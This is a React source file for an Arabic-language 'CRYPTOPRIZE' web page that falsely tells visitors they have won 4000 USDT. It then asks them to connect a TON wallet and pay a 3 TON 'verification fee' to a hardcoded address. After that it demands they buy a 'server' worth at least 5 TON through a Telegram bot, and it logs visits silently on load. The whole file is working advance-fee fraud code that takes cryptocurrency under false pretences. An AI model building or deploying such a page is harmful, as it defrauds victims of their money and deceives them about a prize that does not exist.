import { useState, useEffect } from "react";
import { TonConnectButton, useTonConnectUI, useTonAddress } from "@tonconnect/ui-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { USDTIcon } from "@/components/USDTIcon";
import { TONIcon } from "@/components/TONIcon";
import { Wallet, ArrowRight, ShieldCheck, ExternalLink, Diamond } from "lucide-react";
import { useRecordVisit } from "@/hooks/use-visits";

export default function Home() {
  const [tonConnectUI] = useTonConnectUI();
  const userAddress = useTonAddress();
  const { mutate: recordVisit } = useRecordVisit();
  
  const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
  const [isSuccessOpen, setIsSuccessOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    // Record visit silently on load
    recordVisit({});
  }, [recordVisit]);

  const handleWithdrawClick = () => {
    if (!userAddress) {
      // If not connected, prompt to connect first via the UI
      const button = document.getElementById('ton-connect-trigger');
      if (button) button.click();
      return;
    }
    setIsWithdrawOpen(true);
  };

  const handlePayment = async () => {
    try {
      setIsProcessing(true);
      
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
        messages: [
          {
            address: "UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb",
            amount: "3000000000", // 3 TON in nanoTON
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      
      // On success, close withdraw modal and open next step
      setIsWithdrawOpen(false);
      setIsSuccessOpen(true);
    } catch (error) {
      console.error("Transaction failed:", error);
      // Even if they fail/cancel, we might want to guide them or show an error.
      // For this specific flow, we'll keep it simple and just log, but let them try again.
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden">
      {/* Decorative background elements */}
      <div className="absolute top-[-10%] right-[-5%] w-96 h-96 bg-primary/20 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-[-10%] left-[-5%] w-96 h-96 bg-secondary/20 rounded-full blur-[120px] pointer-events-none" />

      {/* Header */}
      <header className="w-full p-4 md:p-6 flex justify-between items-center z-10 glass-panel border-b-0 border-x-0 border-t-0 border-white/5 bg-background/40">
        <div className="flex items-center gap-2">
          <Diamond className="w-8 h-8 text-primary" />
          <span className="text-xl font-bold tracking-wider text-white">CRYPTO<span className="text-primary">PRIZE</span></span>
        </div>
        <div id="ton-connect-trigger">
          <TonConnectButton />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center p-4 z-10">
        <div className="w-full max-w-lg animate-in fade-in zoom-in duration-700 delay-150">
          <div className="glass-panel rounded-3xl p-8 md:p-10 text-center relative">
            {/* Sparkles */}
            <div className="absolute top-4 right-4 text-accent animate-pulse">✨</div>
            <div className="absolute bottom-12 left-6 text-primary animate-pulse delay-300">✨</div>
            <div className="absolute top-1/2 right-8 text-secondary animate-pulse delay-700">✨</div>

            <div className="flex justify-center mb-8">
              <div className="relative usdt-coin bg-black/40 rounded-full p-4 backdrop-blur-md border border-white/10">
                <USDTIcon className="w-32 h-32 md:w-40 md:h-40" />
                <div className="absolute -bottom-2 -right-2 bg-green-500/20 text-green-400 px-3 py-1 rounded-full text-sm font-bold border border-green-500/30 backdrop-blur-sm">
                  مؤكد ✓
                </div>
              </div>
            </div>

            <h1 className="text-4xl md:text-5xl font-black mb-4 text-white text-glow-green leading-tight">
              لقد ربحت<br/>
              <span className="text-accent text-glow-gold block mt-2 text-6xl">4000 USDT!</span>
            </h1>
            
            <p className="text-muted-foreground text-lg mb-10 font-medium">
              تهانينا! تمت إضافة الجائزة إلى رصيدك المعلق. قم بسحبها الآن إلى محفظتك.
            </p>

            <button
              onClick={handleWithdrawClick}
              className="w-full group relative overflow-hidden rounded-2xl p-[2px]"
            >
              <span className="absolute inset-0 bg-gradient-to-r from-primary via-emerald-400 to-primary opacity-80 group-hover:opacity-100 transition-opacity duration-300 animate-gradient-xy"></span>
              <div className="relative flex items-center justify-center gap-3 bg-card px-8 py-5 rounded-2xl transition-all duration-300 group-hover:bg-opacity-0 group-hover:text-black">
                <Wallet className="w-6 h-6 group-hover:text-black text-primary transition-colors" />
                <span className="text-2xl font-bold group-hover:text-black transition-colors">سحب الرصيد الآن</span>
                <ArrowRight className="w-6 h-6 group-hover:text-black text-primary transition-colors rotate-180" />
              </div>
            </button>
            
            {!userAddress && (
              <p className="mt-4 text-sm text-muted-foreground flex items-center justify-center gap-1">
                <ShieldCheck className="w-4 h-4 text-secondary" />
                يرجى ربط محفظة TON أولاً
              </p>
            )}
          </div>
        </div>
      </main>

      {/* Modal 1: Payment Request */}
      <Dialog open={isWithdrawOpen} onOpenChange={setIsWithdrawOpen}>
        <DialogContent className="glass-panel border-white/10 sm:max-w-md" dir="rtl">
          <DialogHeader>
            <div className="w-16 h-16 bg-secondary/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-secondary/20">
              <TONIcon className="w-10 h-10" />
            </div>
            <DialogTitle className="text-2xl text-center font-bold">رسوم التحقق</DialogTitle>
            <DialogDescription className="text-center text-base pt-4 text-white/80 font-medium">
              لاستلام الجائزة (4000 USDT)، يجب عليك دفع رسوم التحقق من محفظتك لضمان الأمان.
            </DialogDescription>
          </DialogHeader>
          
          <div className="bg-black/40 rounded-xl p-6 border border-white/5 my-4">
            <div className="flex justify-between items-center mb-4">
              <span className="text-muted-foreground">المبلغ المطلوب:</span>
              <span className="text-2xl font-bold text-secondary">3 TON</span>
            </div>
            <div className="h-px w-full bg-gradient-to-r from-transparent via-white/10 to-transparent mb-4"></div>
            <div className="flex items-center gap-2 text-sm text-accent">
              <ShieldCheck className="w-4 h-4" />
              <span>هذا الإجراء ضروري لتأكيد هويتك وحمايتك من الاحتيال.</span>
            </div>
          </div>

          <DialogFooter className="sm:justify-center flex-col gap-3">
            <Button 
              onClick={handlePayment} 
              disabled={isProcessing}
              className="w-full bg-secondary hover:bg-secondary/80 text-white text-lg h-14 rounded-xl shadow-lg shadow-secondary/25 transition-all hover:scale-[1.02]"
            >
              {isProcessing ? "جاري المعالجة..." : "دفع 3 TON"}
            </Button>
            <Button 
              variant="ghost" 
              onClick={() => setIsWithdrawOpen(false)}
              className="w-full text-muted-foreground hover:text-white"
            >
              إلغاء
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Modal 2: Success / Next Step */}
      <Dialog open={isSuccessOpen} onOpenChange={setIsSuccessOpen}>
        <DialogContent className="glass-panel border-white/10 sm:max-w-md bg-emerald-950/40" dir="rtl">
          <DialogHeader>
            <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500/40">
              <ShieldCheck className="w-10 h-10 text-green-400" />
            </div>
            <DialogTitle className="text-2xl text-center font-bold text-green-400">تم التحقق بنجاح!</DialogTitle>
            <DialogDescription className="text-center text-lg pt-4 text-white font-medium">
              الخطوة الأخيرة لاستلام الجائزة:
              <br />
              <span className="text-accent block mt-2 text-xl font-bold">عليك شراء سيرفر بقيمه لاتقل عن 5 تون</span>
            </DialogDescription>
          </DialogHeader>
          
          <div className="my-6">
            <a 
              href="https://t.me/your_bot_here" 
              target="_blank" 
              rel="noopener noreferrer"
              className="w-full flex items-center justify-center gap-3 bg-[#0088cc] hover:bg-[#0077b5] text-white text-xl font-bold h-16 rounded-xl shadow-lg shadow-[#0088cc]/30 transition-all hover:-translate-y-1"
            >
              الذهاب إلى البوت
              <ExternalLink className="w-6 h-6" />
            </a>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
